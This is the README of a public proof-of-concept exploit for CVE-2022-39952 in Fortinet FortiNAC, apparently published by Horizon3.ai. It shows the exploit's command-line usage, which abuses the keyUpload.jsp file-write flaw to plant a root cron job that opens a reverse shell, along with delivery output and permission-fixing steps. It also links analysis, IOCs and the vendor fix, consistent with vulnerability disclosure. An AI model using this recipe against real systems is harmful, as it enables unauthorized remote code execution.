# CVE-2022-39952
POC for CVE-2022-39952 affecting Fortinet FortiNAC

The default configuration of this exploit writes a cron job to create a
reverse shell. Be sure to change the `payload` file to suite your environment.

## Technical Analysis
A technical root cause analysis of the vulnerability and indicators of compromise can be found on our blog:
https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs

## Summary
This POC abuses the keyUpload.jsp endpoint to achieve an arbitrary file write.

## Usage
```plaintext
root@kali:~/CVE-2022-39952# python3 CVE-2022-39952.py --target 10.0.40.85 --file payload
[+] Wrote payload to /etc/cron.d/payload
[+] Payload successfully delivered
```

## Troubleshooting
If using a cron based payload, make sure the payload file has the appropriate
permissions and owner:
```shell
sudo chown root:root payload
```
```shell
sudo chmod 0644 payload 
```

## Mitigations
Update to the latest version by following the instructions within the PSIRT
https://www.fortiguard.com/psirt/FG-IR-22-300

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

